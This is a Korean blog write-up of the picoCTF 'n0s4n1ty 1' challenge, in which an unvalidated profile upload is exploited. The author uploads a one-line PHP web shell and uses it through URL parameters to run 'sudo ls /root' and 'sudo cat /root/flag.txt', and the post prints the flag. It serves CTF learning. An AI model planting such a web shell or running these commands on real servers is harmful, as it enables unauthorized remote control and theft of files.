---
title: "(Easy) n0s4n1ty 1"
date: 2025-08-11 00:00:00 +0900
categories: [picoCTF, Web Exploitation]
tags: [picoctf, n0s4n1ty 1, web hacking, write-up]
---

# picoCTF / Web Exploitation

---

#### Difficulty Level : Easy
#### Title : n0s4n1ty 1

---

![n0s4nlty 1 figure1](/assets/img/picoCTF/2025-08-05-13-46-12.png)

> [Description]  
> 한 개발자가 웹사이트에 프로필 사진 업로드 기능을 추가했지만, 이 구현에는 결함이 있습니다. 이로 인해 당신에게 기회가 생겼습니다.
> 당신의 임무는 (수락한다면) 제공된 웹 페이지에 접속해 파일 업로드 영역을 찾아내는 것입니다. 궁극적인 목표는 /root 디렉터리에 숨겨진 플래그를 찾는 것입니다.

일단 Description 만 읽었을 때는 "파일 업로드"라는 단어가 자꾸 걸린다...

(파일 업로드 취약점이 먹힐 것 같은 느낌...)

우선 우측 상단에 `Launch Instance`를 클릭해서 문제 접속을 위한 인스턴스를 생성하고,  
생성한 링크에 접속해보자.

![n0s4nlty 1 figure2](/assets/img/picoCTF/2025-08-05-13-53-43.png)

링크에 접속하면 사진과 같은 화면을 볼 수 있는데,

파일 선택을 통해 업로드할 파일을 지정하고, Upload Profile 버튼을 누르면 해당 파일이 서버에 업로드 되는 것 같다.

<br>
일단 아무 파일이나 올려봤다.

![n0s4nlty 1 figure3](/assets/img/picoCTF/2025-08-05-14-00-00.png)

\!?!?!?!?  

Profile 업로드라길래 사진만 올릴 수 있는줄 알았는데, 그냥 아무 파일이나 다 올라가는 모양이다. (검증 x)

파일 업로드 취약점이 존재한다는 것을 알았으니, **웹쉘** 을 업로드해서 플래그가 있다고 하는 /root 폴더에 접근해보자.

### Web Shell?
웹 쉘은 웹 서버에 업로드된 악성 스크립트 파일로, 공격자가 해당 서버를 원경에서 제어할 수 있게 해주는 도구를 말한다.

웹 쉘은 주로 php 코드로 작성되는데,  
그 이유는 php가 서버에서 바로 실행되는 언어이기 때문이다.

또한 많은 웹 서버가 php를 기본적으로 지원하고 있으며, 간단한 문법으로도 강력한 기능 구현이 가능하기 때문에 php 코드를 사용한다.

<br>
웹 쉘은 다음과 같이 작성해주었다.

```php
<?php echo shell_exec($_GET['cmd']); ?>
```
(인터넷에 치면 많이 나옴...)

해당 스크립트를 `webshell.php`라는 이름으로 저장하고 이를 업로드해봤다.

![n0s4nlty 1 figure4](/assets/img/picoCTF/2025-08-05-14-11-12.png)

역시나 잘 올라간다.

친절하게 어디에 올라갔는지 경로도 알려준다.

<br>
URL Path 부분에 해당 경로를 입력해서 웹 쉘이 제대로 실행되는지 확인해보자.  
(해당 웹쉘 파일에 접근하는 것만으로도 서버가 스크립트를 바로 실행해버림)

`http://standard-pizzas.picoctf.net:60182/uploads/webshell.php`

![n0s4nlty 1 figure5](/assets/img/picoCTF/2025-08-05-14-14-51.png)

스크립트에서 사용한 `shell_exec()` 함수에서 오류가 발생한 것을 보니 스크립트는 잘 실행되는 것 같다.

<br>
이제 /root 폴더 내부를 확인해보자!

업로드한 웹 쉘은 GET 방식으로 cmd에 값을 받아 명령어를 실행하므로, 다음과 같은 방식으로 명령어를 전달 할 수 있다.

`http://standard-pizzas.picoctf.net:60182/uploads/webshell.php?cmd=ls%20/root`  
(%20은 띄어쓰기)

![n0s4nlty 1 figure6](/assets/img/picoCTF/2025-08-05-14-20-05.png)

?!?!?!?!

아무것도 안뜬다...

왜냐하면 권한이 없기 때문...

명령 하나를 root 권한으로 실행시키는 방법이 있는데,  
바로 `sudo` 이다.

`sudo`를 앞에 붙여서 다시 확인해보면.

`http://standard-pizzas.picoctf.net:60182/uploads/webshell.php?cmd=sudo%20ls%20/root`

![n0s4nlty 1 figure7](/assets/img/picoCTF/2025-08-05-14-22-18.png)

오오오 보인다!

이제 해당 파일을 또 `sudo`와 함께 읽어주면?

`http://standard-pizzas.picoctf.net:60182/uploads/webshell.php?cmd=sudo%20cat%20/root/flag.txt`

![n0s4nlty 1 figure8](/assets/img/picoCTF/2025-08-05-14-23-34.png)

이렇게 플래그를 얻어낼 수 있다.

<br>

flag : ~~picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}~~